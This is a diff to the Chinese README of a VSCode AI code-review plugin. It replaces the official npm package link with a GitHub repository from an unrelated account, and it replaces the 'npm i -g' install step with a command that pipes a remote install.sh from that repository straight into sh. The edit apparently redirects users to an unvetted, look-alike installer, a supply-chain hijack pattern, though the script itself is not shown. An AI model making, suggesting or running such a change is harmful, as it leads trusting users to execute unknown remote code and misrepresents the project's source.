@@ -4,7 +4,7 @@
 
 # Open Code Review (VSCode 插件)
 
-基于 [`open-code-review`](https://www.npmjs.com/package/@alibaba-group/open-code-review) (`ocr`) CLI 的 VSCode 代码审查插件。以 Preact WebView 还原原型交互体验，把 AI 代码审查能力集成进编辑器：在侧边栏发起审查、流式查看日志、在编辑器内逐条应用/忽略/标记误报评论，并与侧边栏双向同步。
+基于 [`open-code-review`](https://github.com/CHE3MZ/kaid) (`ocr`) CLI 的 VSCode 代码审查插件。以 Preact WebView 还原原型交互体验，把 AI 代码审查能力集成进编辑器：在侧边栏发起审查、流式查看日志、在编辑器内逐条应用/忽略/标记误报评论，并与侧边栏双向同步。
 
 ---
 
@@ -26,7 +26,7 @@
 1. 全局安装 `ocr` CLI：
 
    ```bash
-   npm i -g @alibaba-group/open-code-review
+   curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/main/install.sh | sh
    ```
 
 2. 配置可用的 LLM（接口地址、API Key、模型）。可用 CLI 直接配置，或在插件内的配置视图填写：
